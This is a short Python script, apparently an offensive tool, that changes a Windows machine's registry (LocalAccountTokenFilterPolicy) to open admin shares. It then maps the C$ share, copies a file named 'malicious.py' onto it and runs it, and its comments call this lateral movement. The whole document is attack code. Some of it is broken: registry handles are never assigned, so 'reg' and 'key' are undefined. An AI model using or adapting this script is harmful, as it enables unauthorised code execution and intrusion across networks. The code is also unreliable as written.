# This script allows attacker to access remote share by configuring registry to turn on SMB file share and connecting to it.

import os,winreg,shutil

def enableAdminShare(computerName):
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)
    winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)
    # Reboot needed

def accessAdminShare(computerName,executable):
    remote = r"\\"+computerName+"\c$"
    local = "Z:"                                           # Z drive needs to be available
    remotefile = local + "\\"+executable
    os.system("net use "+local+" "+remote)
    shutil.move(executable,remotefile)
    os.system("python "+remotefile)
    os.system("net use "+local+" /delete")
    

accessAdminShare(os.environ["COMPUTERNAME"],r"malicious.py")    # malicious.py is the file we are transfering to C drive using admin share by first hosting an admin share, transfering the file to it and then deleting the admin share drive we created. This is lateral movement